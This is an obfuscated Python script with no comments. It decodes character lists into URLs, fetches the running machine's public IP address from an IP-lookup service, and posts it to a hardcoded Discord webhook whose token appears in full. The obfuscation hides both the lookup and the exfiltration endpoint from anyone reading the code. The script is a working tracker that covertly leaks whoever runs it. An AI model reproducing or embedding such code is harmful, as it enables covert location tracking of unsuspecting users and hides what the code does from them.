import requests
jx=str
jK=requests.get
jM=requests.post
def jy(jX,content):
  jn={("".join([chr(99),chr(111),chr(110),chr(116),chr(101),chr(110),chr(116)]))                   :content  }
  jw=jM(jX,data=jn)
  return jw.status_code
def jv():
  jw=jK(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(97),chr(112),chr(105),chr(46),chr(105),chr(112),chr(105),chr(102),chr(121),chr(46),chr(111),chr(114),chr(103),chr(63),chr(102),chr(111),chr(114),chr(109),chr(97),chr(116),chr(61),chr(106),chr(115),chr(111),chr(110)]))                                           )
  jG=jw.json()
  return jG
def jz():
  jX=("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(100),chr(105),chr(115),chr(99),chr(111),chr(114),chr(100),chr(46),chr(99),chr(111),chr(109),chr(47),chr(97),chr(112),chr(105),chr(47),chr(119),chr(101),chr(98),chr(104),chr(111),chr(111),chr(107),chr(115),chr(47),chr(49),chr(50),chr(52),chr(51),chr(57),chr(57),chr(56),chr(57),chr(49),chr(54),chr(48),chr(50),chr(54),chr(56),chr(51),chr(49),chr(48),chr(52),chr(51),chr(47),chr(86),chr(104),chr(104),chr(118),chr(45),chr(109),chr(50),chr(53),chr(80),chr(103),chr(105),chr(83),chr(70),chr(49),chr(52),chr(71),chr(120),chr(111),chr(45),chr(85),chr(105),chr(119),chr(48),chr(100),chr(75),chr(88),chr(105),chr(80),chr(101),chr(69),chr(79),chr(110),chr(57),chr(68),chr(49),chr(45),chr(49),chr(56),chr(111),chr(117),chr(112),chr(87),chr(70),chr(106),chr(80),chr(102),chr(122),chr(79),chr(103),chr(97),chr(81),chr(84),chr(85),chr(114),chr(107),chr(82),chr(102),chr(98),chr(104),chr(115),chr(73),chr(117),chr(90),chr(84),chr(86),chr(74),chr(89),chr(73)]))
  jG=jv()
  jy(jX,jx(jG))
if __name__==("".join([chr(95),chr(95),chr(109),chr(97),chr(105),chr(110),chr(95),chr(95)]))                       :
  jz()
